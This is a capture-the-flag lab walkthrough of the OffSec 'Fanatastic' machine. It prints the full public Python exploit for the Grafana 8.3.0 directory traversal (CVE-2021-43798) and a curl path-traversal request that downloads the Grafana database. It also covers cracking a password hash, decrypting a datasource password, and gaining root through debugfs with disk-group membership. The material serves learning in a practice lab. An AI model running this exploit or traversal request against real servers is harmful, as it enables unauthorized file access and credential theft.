# Fanatastic

- [Machine information](#machine-information)
- [Solution](#solution)
- [References](#references)

## Machine information

```text
Type: PG Practice
Difficulty: Fundamental
Community Rating: Hard
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
OS: Linux
Points: 15
Number of Flags: 2
Lab Description:
This lab will be exploited by leveraging vulnerabilities identified in Grafana v8.3.0. Publicly available exploits 
will be used to obtain a secret key, which will then be decrypted to retrieve the system admin password, allowing 
for root-level access to the system. This lab focuses on exploiting application vulnerabilities and privilege 
escalation methods.
```

Machine link: [https://portal.offsec.com/machine/fanatastic-37029/overview/details](https://portal.offsec.com/machine/fanatastic-37029/overview/details)

## Solution

### Scan for services with nmap

We start by scanning the machine on all TCP-ports with `nmap`, including service info and default scripts.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Fundamental/Fanatastic]
└─$ export TARGET_IP=192.168.179.181

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Fundamental/Fanatastic]
└─$ sudo nmap -sC -sV -p- $TARGET_IP
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-16 08:27 +0100
Nmap scan report for 192.168.179.181
Host is up (0.033s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
3000/tcp open  http    Grafana http
| http-title: Grafana
|_Requested resource was /login
| http-robots.txt: 1 disallowed entry 
|_/
|_http-trane-info: Problem with XML parsing of /evox/about
9090/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-title: Prometheus Time Series Collection and Processing Server
|_Requested resource was /graph
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.48 seconds
```

We have the following TCP-services running and available:

- [OpenSSH](https://en.wikipedia.org/wiki/OpenSSH) version 8.2p1 on port 22
- [Grafana](https://en.wikipedia.org/wiki/Grafana) web server on port 3000
- A Golang net/http server on port 9090

In addition, we do a scan of the top 100 UDP-ports but find nothing:

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Fundamental/Fanatastic]
└─$ sudo nmap -sU --top-ports 100 -sV -sC $TARGET_IP
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-16 08:28 +0100
Nmap scan report for 192.168.179.181
Host is up (0.034s latency).
All 100 scanned ports on 192.168.179.181 are in ignored states.
Not shown: 54 closed udp ports (port-unreach), 46 open|filtered udp ports (no-response)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 314.77 seconds
```

### Analyse the web sites

Browsing manually to `http://192.168.179.181:3000/` redirects us to `http://192.168.179.181:3000/login` and gives us a Grafana login page:

![Fanatastic Grafana Login](Images/Fanatastic_Grafana_Login.png)

The Grafana version running is: `v8.3.0`.

Browsing to `http://192.168.179.181:9090/` presents a [Prometheus](https://prometheus.io/) page:

![Fanatastic Prometheus](Images/Fanatastic_Prometheus.png)

Scans with `whatweb` gives us the following information:

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Fundamental/Fanatastic]
└─$ whatweb -a3 http://$TARGET_IP:3000
http://192.168.179.181:3000 [302 Found] Cookies[redirect_to], Country[RESERVED][ZZ], HttpOnly[redirect_to], IP[192.168.179.181], RedirectLocation[/login], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-XSS-Protection[1; mode=block]
http://192.168.179.181:3000/login [200 OK] Country[RESERVED][ZZ], Grafana[8.3.0], HTML5, IP[192.168.179.181], Script, Title[Grafana], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block]

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Fundamental/Fanatastic]
└─$ whatweb -a3 http://$TARGET_IP:9090
http://192.168.179.181:9090 [302 Found] Country[RESERVED][ZZ], IP[192.168.179.181], RedirectLocation[/graph]
http://192.168.179.181:9090/graph [200 OK] Country[RESERVED][ZZ], HTML5, IP[192.168.179.181], Script, Title[Prometheus Time Series Collection and Processing Server]
```

### Search for exploits

Let's see if we can find some exploits for the Grafana version.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Fundamental/Fanatastic]
└─$ searchsploit grafana 8.3.0 
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                         |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read                                                                                            | multiple/webapps/50581.py
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Fundamental/Fanatastic]
└─$ searchsploit -m 50581
  Exploit: Grafana 8.3.0 - Directory Traversal and Arbitrary File Read
      URL: https://www.exploit-db.com/exploits/50581
     Path: /usr/share/exploitdb/exploits/multiple/webapps/50581.py
    Codes: CVE-2021-43798
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /mnt/hgfs/OffSec_PG/PG_Practice/Fundamental/Fanatastic/50581.py


┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Fundamental/Fanatastic]
└─$ cat 50581.py 
# Exploit Title: Grafana 8.3.0 - Directory Traversal and Arbitrary File Read
# Date: 08/12/2021
# Exploit Author: s1gh
# Vendor Homepage: https://grafana.com/
# Vulnerability Details: https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p
# Version: V8.0.0-beta1 through V8.3.0
# Description: Grafana versions 8.0.0-beta1 through 8.3.0 is vulnerable to directory traversal, allowing access to local files.
# CVE: CVE-2021-43798
# Tested on: Debian 10
# References: https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p47p

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import argparse
import sys
from random import choice

plugin_list = [
    "alertlist",
    "annolist",
    "barchart",
    "bargauge",
    "candlestick",
    "cloudwatch",
    "dashlist",
    "elasticsearch",
    "gauge",
    "geomap",
    "gettingstarted",
    "grafana-azure-monitor-datasource",
    "graph",
    "heatmap",
    "histogram",
    "influxdb",
    "jaeger",
    "logs",
    "loki",
    "mssql",
    "mysql",
    "news",
    "nodeGraph",
    "opentsdb",
    "piechart",
    "pluginlist",
    "postgres",
    "prometheus",
    "stackdriver",
    "stat",
    "state-timeline",
    "status-histor",
    "table",
    "table-old",
    "tempo",
    "testdata",
    "text",
    "timeseries",
    "welcome",
    "zipkin"
]

def exploit(args):
    s = requests.Session()
    headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.' }

    while True:
        file_to_read = input('Read file > ')

        try:
            url = args.host + '/public/plugins/' + choice(plugin_list) + '/../../../../../../../../../../../../..' + file_to_read
            req = requests.Request(method='GET', url=url, headers=headers)
            prep = req.prepare()
            prep.url = url
            r = s.send(prep, verify=False, timeout=3)

            if 'Plugin file not found' in r.text:
                print('[-] File not found\n')
            else:
                if r.status_code == 200:
                    print(r.text)
                else:
                    print('[-] Something went wrong.')
                    return
        except requests.exceptions.ConnectTimeout:
            print('[-] Request timed out. Please check your host settings.\n')
            return
        except Exception:
            pass

def main():
    parser = argparse.ArgumentParser(description="Grafana V8.0.0-beta1 - 8.3.0 - Directory Traversal and Arbitrary File Read")
    parser.add_argument('-H',dest='host',required=True, help="Target host")
    args = parser.parse_args()

    try:
        exploit(args)
    except KeyboardInterrupt:
        return


if __name__ == '__main__':
    main()
    sys.exit(0)    
```

Looks good! Let's try it out.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Fundamental/Fanatastic]
└─$ python 50581.py
usage: 50581.py [-h] -H HOST
50581.py: error: the following arguments are required: -H

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Fundamental/Fanatastic]
└─$ python 50581.py -H http://$TARGET_IP:3000
Read file > /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
grafana:x:113:117::/usr/share/grafana:/bin/false
prometheus:x:1000:1000::/home/prometheus:/bin/false
sysadmin:x:1001:1001::/home/sysadmin:/bin/sh

Read file > 
```

### Read the grafana configuration file

Now the question becomes, what file would we like to read? How about the Grafana [configuration file](https://grafana.com/docs/grafana/latest/setup-grafana/configure-grafana/#linux)?

```bash
Read file > /etc/grafana/grafana.ini
##################### Grafana Configuration Example #####################
#
# Everything has defaults so you only need to uncomment things you want to
# change

# possible values : production, development
;app_mode = production

# instance name, defaults to HOSTNAME environment variable value or hostname if HOSTNAME var is empty
;instance_name = ${HOSTNAME}

#################################### Paths ####################################
[paths]
# Path to where grafana can store temp files, sessions, and the sqlite3 db (if that is used)
;data = /var/lib/grafana

# Temporary files in `data` directory older than given duration will be removed
;temp_data_lifetime = 24h

# Directory where grafana can store logs
;logs = /var/log/grafana

# Directory where grafana will automatically scan and look for plugins
;plugins = /var/lib/grafana/plugins

# folder that contains provisioning config files that grafana will apply on startup and while running.
;provisioning = conf/provisioning

<---snip--->

#################################### Database ####################################
[database]
# You can configure the database connection by specifying type, host, name, user and password
# as separate properties or as on string using the url properties.

# Either "mysql", "postgres" or "sqlite3", it's your choice
;type = sqlite3
;host = 127.0.0.1:3306
;name = grafana
;user = root
# If the password contains # or ; you have to wrap it with triple quotes. Ex """#password;"""
;password =

# Use either URL or the previous fields to configure the database
# Example: mysql://user:secret@host:port/database
;url =

# For "postgres" only, either "disable", "require" or "verify-full"
;ssl_mode = disable

# Database drivers may support different transaction isolation levels.
# Currently, only "mysql" driver supports isolation levels.
# If the value is empty - driver's default isolation level is applied.
# For "mysql" use "READ-UNCOMMITTED", "READ-COMMITTED", "REPEATABLE-READ" or "SERIALIZABLE".
;isolation_level =

;ca_cert_path =
;client_key_path =
;client_cert_path =
;server_cert_name =

# For "sqlite3" only, path relative to data_path setting
;path = grafana.db

# Max idle conn setting default is 2
;max_idle_conn = 2

# Max conn setting default is 0 (mean not set)
;max_open_conn =

# Connection Max Lifetime default is 14400 (means 14400 seconds or 4 hours)
;conn_max_lifetime = 14400

# Set to true to log the sql calls and execution times.
;log_queries =

# For "sqlite3" only. cache mode setting used for connecting to the database. (private, shared)
;cache_mode = private

<---snip--->

#################################### Security ####################################
[security]
# disable creation of admin user on first start of grafana
;disable_initial_admin_creation = false

# default admin user, created on startup
;admin_user = admin

# default admin password, can be changed before first start of grafana,  or in profile settings
;admin_password = admin

# used for signing
;secret_key = SW2YcwTIb9zpOOhoPsMm

# current key provider used for envelope encryption, default to static value specified by secret_key
;encryption_provider = secretKey

<---snip--->

# Enable or disable loading other base map layers
;enable_custom_baselayers = true

Read file > 
```

We have credentials (`admin:admin`), a secret key and the location of the grafana database (`/var/lib/grafana/grafana.db`) which is a sqlite3 database.

### Download the Grafana datbase

Why not try to download the database? This is done manually with `curl` based on the request made in the exploit.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Fundamental/Fanatastic]
└─$ curl --path-as-is "http://$TARGET_IP:3000/public/plugins/alertlist/../../../../../../../../../../../../../var/lib/grafana/grafana.db" -o grafana.db
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100 748.0k 100 748.0k   0      0  1.23M      0                              0

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Fundamental/Fanatastic]
└─$ file grafana.db 
grafana.db: SQLite 3.x database, last written using SQLite version 3035004, file counter 402, database pages 187, cookie 0x138, schema 4, UTF-8, version-valid-for 402
```

### Analyse the Grafana database

Next, we examine the database in search for credentials.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Fundamental/Fanatastic]
└─$ sqlite3 grafana.db 
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
alert                       ngalert_configuration 
alert_configuration         org 
alert_instance              org_user 
alert_notification          permission 
alert_notification_state    playlist 
alert_rule                  playlist_item 
alert_rule_tag              plugin_setting 
alert_rule_version          preferences 
annotation                  quota 
annotation_tag              role 
api_key                     seed_assignment 
builtin_role                server_lock 
cache_data                  session 
dashboard                   short_url 
dashboard_acl               star 
dashboard_provisioning      tag 
dashboard_snapshot          team 
dashboard_tag               team_member 
dashboard_version           team_role 
data_keys                   temp_user 
data_source                 test_data 
kv_store                    user 
library_element             user_auth 
library_element_connection  user_auth_token 
login_attempt               user_role 
migration_log 
sqlite> .headers on
sqlite> select * from user;
id|version|login|email|name|password|salt|rands|company|org_id|is_admin|email_verified|theme|created|updated|help_flags1|last_seen_at|is_disabled|is_service_account
1|0|admin|admin@localhost||63f576276a6db59bb750c34f126945c1e941f9e3b21ab2f5be74ae00cc8abfc1b9f7ee5840f9abdae46efc0ee5350bd65aa8|0Vq2cDMrPt|zt192oddkH||1|1|0||2022-02-04 09:18:01|2022-02-04 09:19:59|0|2022-02-04 09:19:59|0|0
sqlite> 
```

So far so good.

### Extract and prepare the hashes

To convert the hash and salt to a format readable by hashcat we will use [Grafana2Hashcat](https://github.com/iamaldi/grafana2hashcat):

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Fundamental/Fanatastic]
└─$ git clone https://github.com/iamaldi/grafana2hashcat.git 
Cloning into 'grafana2hashcat'...
remote: Enumerating objects: 16, done.
remote: Counting objects: 100% (16/16), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 16 (delta 3), reused 4 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (16/16), 5.74 KiB | 195.00 KiB/s, done.
Resolving deltas: 100% (3/3), done.

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Fundamental/Fanatastic]
└─$ cd grafana2hashcat 

┌──(kali㉿kali)-[/mnt/…/PG_Practice/Fundamental/Fanatastic/grafana2hashcat]
└─$ ls -l 
total 7
-rwxrwxrwx 1 root root 2465 Nov 16 09:33 grafana2hashcat.py
-rwxrwxrwx 1 root root 3732 Nov 16 09:33 README.md

┌──(kali㉿kali)-[/mnt/…/PG_Practice/Fundamental/Fanatastic/grafana2hashcat]
└─$ python grafana2hashcat.py -h 
usage: grafana2hashcat.py [-h] [-o outfile] hashes

Convert Grafana hashes to Hashcat's PBKDF2_HMAC_SHA256 format.

positional arguments:
  hashes      Input file holding the Grafana hashes in the 'hash,salt' format.

options:
  -h, --help  show this help message and exit
  -o outfile  Output filename to save the Hashcat's PBKDF2_HMAC_SHA256 hashes. Default is stdout.
```

So the hash and salt should be comma-separated.

```bash
┌──(kali㉿kali)-[/mnt/…/PG_Practice/Fundamental/Fanatastic/grafana2hashcat]
└─$ vi grafana_hashes_raw.txt

┌──(kali㉿kali)-[/mnt/…/PG_Practice/Fundamental/Fanatastic/grafana2hashcat]
└─$ cat grafana_hashes_raw.txt 
63f576276a6db59bb750c34f126945c1e941f9e3b21ab2f5be74ae00cc8abfc1b9f7ee5840f9abdae46efc0ee5350bd65aa8,0Vq2cDMrPt

┌──(kali㉿kali)-[/mnt/…/PG_Practice/Fundamental/Fanatastic/grafana2hashcat]
└─$ python grafana2hashcat.py -o grafana_hashes.txt grafana_hashes_raw.txt 

[+] Grafana2Hashcat
[+] Reading Grafana hashes from:  grafana_hashes_raw.txt
[+] Done! Read 1 hashes in total.
[+] Converting hashes...
[+] Converting hashes complete.
[+] Writing output to 'grafana_hashes.txt' file.
[+] Now, you can run Hashcat with the following command, for example:

hashcat -m 10900 hashcat_hashes.txt --wordlist wordlist.txt


┌──(kali㉿kali)-[/mnt/…/PG_Practice/Fundamental/Fanatastic/grafana2hashcat]
└─$ cat grafana_hashes.txt    
sha256:10000:MFZxMmNETXJQdA==:Y/V2J2pttZu3UMNPEmlFwelB+eOyGrL1vnSuAMyKv8G59+5YQPmr2uRu/A7lNQvWWqg=
```

### Try to crack the hashes

Then we try to crack the hashes with `hashcat` and the Rockyou wordlist:

```bash
┌──(kali㉿kali)-[/mnt/…/PG_Practice/Fundamental/Fanatastic/grafana2hashcat]
└─$ hashcat -m 10900 grafana_hashes.txt /usr/share/wordlists/rockyou.txt  
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #01: cpu-sandybridge-Intel(R) Core(TM) i7-4790 CPU @ 3.60GHz, 2945/5890 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (4467 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected? 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: sha256:10000:MFZxMmNETXJQdA==:Y/V2J2pttZu3UMNPEmlFw...vWWqg=
Time.Started.....: Mon Nov 16 09:41:24 2026 (9 mins, 23 secs)
Time.Estimated...: Mon Nov 16 11:49:21 2026 (1 hour, 58 mins)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:     1868 H/s (12.27ms) @ Accel:62 Loops:500 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 1051024/14344385 (7.33%)
Rejected.........: 0/1051024 (0.00%)
Restore.Point....: 1051024/14344385 (7.33%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:7000-7500
Candidate.Engine.: Device Generator
Candidates.#01...: Jason07 -> JOELLA
Hardware.Mon.#01.: Util: 88%

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => q

Session..........: hashcat 
Status...........: Quit
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: sha256:10000:MFZxMmNETXJQdA==:Y/V2J2pttZu3UMNPEmlFw...vWWqg=
Time.Started.....: Mon Nov 16 09:41:24 2026 (22 mins, 29 secs)
Time.Estimated...: Mon Nov 16 11:51:17 2026 (1 hour, 47 mins)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:     1837 H/s (12.21ms) @ Accel:62 Loops:500 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 2507776/14344385 (17.48%)
Rejected.........: 0/2507776 (0.00%)
Restore.Point....: 2507776/14344385 (17.48%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:1000-1500
Candidate.Engine.: Device Generator
Candidates.#01...: zerox24 -> zerodeck5
Hardware.Mon.#01.: Util: 87%

Started: Mon Nov 16 09:40:58 2026
Stopped: Mon Nov 16 10:03:54 2026
```

But when the hash wasn't crack after more then 20 minutes I started to second guess my approach.

### Re-check the Grafana database

It turns out there can be credentials in another database table (`data_source`) as well:

```bash
sqlite> select * from data_source;
id|org_id|version|type|name|access|url|password|user|database|basic_auth|basic_auth_user|basic_auth_password|is_default|json_data|created|updated|with_credentials|secure_json_data|read_only|uid 
1|1|1|prometheus|Prometheus|server|http://localhost:9090||||0|sysadmin||0|{}|2022-02-04 09:19:59|2022-02-04 09:19:59|0|{"basicAuthPassword":"anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w=="}|0|HkdQ8Ganz
sqlite> 
```

And to decrypt it we can use [this decryptor](https://github.com/Sic4rio/Grafana-Decryptor-for-CVE-2021-43798).

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Fundamental/Fanatastic]
└─$ source ~/Python_venvs/CVE-2021-43798_decryptor/bin/activate
 
┌──(CVE-2021-43798_decryptor)─(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Fundamental/Fanatastic]
└─$ decrypt.py   

    ###################################### 
             GRAFANA DECRYPTOR 
 CVE-2021-43798 Grafana Unauthorized 
  arbitrary file reading vulnerability 
                SICARI0 
    ###################################### 
 
? Enter the datasource password: anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w==
/home/kali/Python_venvs/CVE-2021-43798_decryptor/bin/decrypt.py:57: CryptographyDeprecationWarning: CFB has been moved to cryptography.hazmat.decrepit.ciphers.modes.CFB and will be removed from cryptography.hazmat.primitives.ciphers.modes in 49.0.0.
  decryptor = Cipher(algorithms.AES(block), modes.CFB(iv), backend=default_backend()).decryptor()
[*] grafanaIni_secretKey= SW2YcwTIb9zpOOhoPsMm
[*] DataSourcePassword= anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w==
[*] plainText= SuperSecureP@ssw0rd
```

The secret key seems to be the default one and we now have a plaintext password (`SuperSecureP@ssw0rd`).

### Connect as sysadmin with SSH

As a next step, it seems likely that we can connect with SSH using this password as one of the users found earlier. That is, either `prometheus` or `sysadmin`.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Fundamental/Fanatastic]
└─$ ssh prometheus@$TARGET_IP 
The authenticity of host '192.168.179.181 (192.168.179.181)' can't be established.
ED25519 key fingerprint is SHA256:D9EwlP6OBofTctv3nJ2YrEmwQrTfB9lLe4l8CqvcVDI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.179.181' (ED25519) to the list of known hosts.
prometheus@192.168.179.181's password: 
Permission denied, please try again.
prometheus@192.168.179.181's password: 

 
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Fundamental/Fanatastic]
└─$ ssh sysadmin@$TARGET_IP
sysadmin@192.168.179.181's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-97-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 16 Nov 2026 09:21:35 AM UTC

  System load:  0.0               Processes:               208
  Usage of /:   57.2% of 9.78GB   Users logged in:         0
  Memory usage: 33%               IPv4 address for ens160: 192.168.179.181
  Swap usage:   0%


0 updates can be applied immediately.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$ 
```

And we succeed as `sysadmin`!

### Get the user flag

Now we can get the user flag.

```bash
$ ls -la
total 28
drwxr-xr-x 3 sysadmin sysadmin 4096 Nov 16 09:21 .
drwxr-xr-x 3 root     root     4096 Feb  4  2022 ..
lrwxrwxrwx 1 root     root        9 Feb  4  2022 .bash_history -> /dev/null
-rw-r--r-- 1 sysadmin sysadmin  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 sysadmin sysadmin 3771 Feb 25  2020 .bashrc
drwx------ 2 sysadmin sysadmin 4096 Nov 16 09:21 .cache
-rw------- 1 sysadmin sysadmin   33 Nov 16 07:25 local.txt
-rw-r--r-- 1 sysadmin sysadmin  807 Feb 25  2020 .profile
$ cat local.txt 
e<REDACTED>5
$ 
```

### Enumeration for privesc

It's time to search for privilege escalation oppurtunities and we use my [Linux PrivEsc Checklist](https://cajac.gitbook.io/ctf-notes/priv-esc/linux-privilege-escalation/linux-privesc-checklist) as guidance.

Checking for group memberships, we note that we are a member of the `disk` group.

```bash
$ id
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin),6(disk)
$ 
```

This membership is almost equivalent to root access as we can access all the files in the file system.

### Get a root shell

To start, we need to find out wehre the root (`/`) file system is mounted.

```bash
$ df -h
Filesystem      Size  Used Avail Use% Mounted on
udev            445M     0  445M   0% /dev
tmpfs            98M  1.2M   97M   2% /run
/dev/sda2       9.8G  5.6G  3.7G  61% /
tmpfs           489M     0  489M   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           489M     0  489M   0% /sys/fs/cgroup
/dev/loop0       62M   62M     0 100% /snap/core20/1328
/dev/loop1       33M   33M     0 100% /snap/snapd/12883
/dev/loop3       56M   56M     0 100% /snap/core18/2128
/dev/loop6       71M   71M     0 100% /snap/lxd/21029
/dev/loop4       68M   68M     0 100% /snap/lxd/21835
/dev/loop2       44M   44M     0 100% /snap/snapd/14549
/dev/loop5       56M   56M     0 100% /snap/core18/2284
tmpfs            98M     0   98M   0% /run/user/1001
$ 
```

It is mounted on `/dev/sda2`.

Next, we start to debug this file system and navigate to the `/root` directory.

```bash
$ debugfs /dev/sda2
debugfs 1.45.5 (07-Jan-2020)
debugfs:  cd /root
```

### Get the root flag

Finally, we get the root flag.

```bash
debugfs:  cat proof.txt
d<REDACTED>8
debugfs:  quit
$ 
```

For additional information, please see the references below.

## References

- [CVE-2021-43798 - NIST](https://nvd.nist.gov/vuln/detail/cve-2021-43798)
- [Configure Grafana - Grafana Docs](https://grafana.com/docs/grafana/latest/setup-grafana/configure-grafana/)
- [curl - Homepage](https://curl.se/)
- [curl - Linux manual page](https://man7.org/linux/man-pages/man1/curl.1.html)
- [cURL - Wikipedia](https://en.wikipedia.org/wiki/CURL)
- [debugfs - Linux manual page](https://linux.die.net/man/8/debugfs)
- [df - Linux manual page](https://man7.org/linux/man-pages/man1/df.1.html)
- [Directory traversal attack - Wikipedia](https://en.wikipedia.org/wiki/Directory_traversal_attack)
- [Disk Group Privilege Escalation - Hacking Articles](https://www.hackingarticles.in/disk-group-privilege-escalation/)
- [export - Linux manual page](https://www.man7.org/linux/man-pages/man1/export.1p.html)
- [file - Linux manual page](https://man7.org/linux/man-pages/man1/file.1.html)
- [git-clone - Linux manual page](https://man7.org/linux/man-pages/man1/git-clone.1.html)
- [Grafana - Wikipedia](https://en.wikipedia.org/wiki/Grafana)
- [Grafana 8.3.0 - Directory Traversal and Arbitrary File Read - ExploitDB](https://www.exploit-db.com/exploits/50581)
